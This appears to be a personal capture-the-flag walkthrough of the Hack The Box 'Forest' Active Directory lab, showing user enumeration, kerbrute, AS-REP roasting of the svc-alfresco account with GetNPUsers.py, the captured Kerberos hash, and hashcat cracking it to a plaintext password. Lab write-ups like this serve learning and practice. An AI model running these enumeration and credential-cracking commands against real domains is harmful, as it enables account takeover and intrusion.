
```
index: 0x2137 RID: 0x463 acb: 0x00020015 Account: $331000-VK4ADACQNUCA  Name: (null)    Desc: (null)                                   
index: 0xfbc RID: 0x1f4 acb: 0x00000010 Account: Administrator  Name: Administrator     Desc: Built-in account for administering the computer/domain
index: 0x2369 RID: 0x47e acb: 0x00000210 Account: andy  Name: Andy Hislip       Desc: (null)
index: 0xfbe RID: 0x1f7 acb: 0x00000215 Account: DefaultAccount Name: (null)    Desc: A user account managed by the system.
```
![[Pasted image 20231114150919.png]]

```
Account: lucinda       Name: Lucinda Berger    Desc: (null)
index: 0x236a RID: 0x47f acb: 0x00000210 Account: mark  Name: Mark Brandt       Desc: (null)
index: 0x236b RID: 0x480 acb: 0x00000210 Account: santi Name: Santi Rodriguez   Desc: (null)
index: 0x235c RID: 0x479 acb: 0x00000210 Account: sebastien     Name: Sebastien Caron
```
![[Pasted image 20231114150950.png]]

```
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[$331000-VK4ADACQNUCA] rid:[0x463]

user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]
user:[andy] rid:[0x47e]
user:[mark] rid:[0x47f]
user:[santi] rid:[0x480]

```

DNS enumeration
![[Pasted image 20231114152326.png]]

```
dnsrecon -r 127.0.0.0/24 -n 10.10.10.161
```
![[Pasted image 20231114152720.png]]

So we have usernames with us let try to brute force it using kerbutes that we have used earlier in active Directory.
```
kerbrute userenum -d htb.local --dc 10.10.10.161 userlist.txt -t 100
```
![[Pasted image 20231114154019.png]]
```
Administrator
andy
mark
santi
sebastien
krbtgt
DefaultAccount
$331000-VK4ADACQNUCA
lucinda
svc-alfresco
andy
mark

sebastien@htb.local
lucinda@htb.local
Administrator@htb.local
mark@htb.local
santi@htb.local
svc-alfresco@htb.local
mark@htb.local
andy@htb.local
mark@htb.local
forest@htb.local
Mark@htb.local
administrator@htb.local
Andy@htb.local
sebastien@htb.local
MARK@htb.local
Forest@htb.local
santi@htb.local
lucinda@htb.local
Administrator@htb.local
ANDY@htb.local
```

Let's see which account seems juicy to us

Administrator@htb.local
Forest@htb.local
svc-alfresco@htb.local


Seeing the service account only one thing comes to mind is to get the kerbrose ticket
let see if we can get the hash for it or not.
```
GetNPUsers.py -dc-ip 10.10.10.161  htb.local/svc-alfresco -no-pass
```
![[Pasted image 20231114154722.png]]
My hunch was right and we got the hash.

```
$krb5asrep$23$svc-alfresco@HTB.LOCAL:56f523791e059c3f7bef1cd5a7b4d13d$7ee816dbbca9b4ed3d15391217dee6008846179f82bd5db231b77ea81c1f8e516ccb0b5e543e218f9a0786e1524595afafa58e19268210f21ce1e6a1c411226fa454b5a6f1ab47b3de26834f40cce90d6fff87a9fa629074c96e74da5e4a4a72f3a220ddb9a78c13c8f6a5af0cb3a9d3643349ff51cb05ad8434914c01d26475c418c10cd4517a60043c20c4573dd450421fabe1db2e7eb1d5f9780023a7fe8955ad3e69656163980184823e6c2e7cb428c9fc8e90d40605f04abcf891016de01bc0f4f68222fa40c1553cae2ee44ce319e859cffabec1d71ec7cf7537297674d96c0e488d36
```

But before cracking it let's analyse the version and everything of it.
```
hashcat --help | grep Kerberos
```
![[Pasted image 20231114155037.png]]
As you can see that we have version 5 and etype of 23 
7500 || 13100 || 18200

Let's now see if we can crack it or not
so 18200 type was confirmed and after trying like 3-4 times with little tweaks got the password
```
.\hashcat.exe -m 18200 -a 0 -D 2 .\hashes4.txt .\rockyou.txt -O
```
![[Pasted image 20231114155533.png]]

So we got the password
```
s3rvice
```
Now we can either login in smb and see if it's working or try psexec or evil-winrm

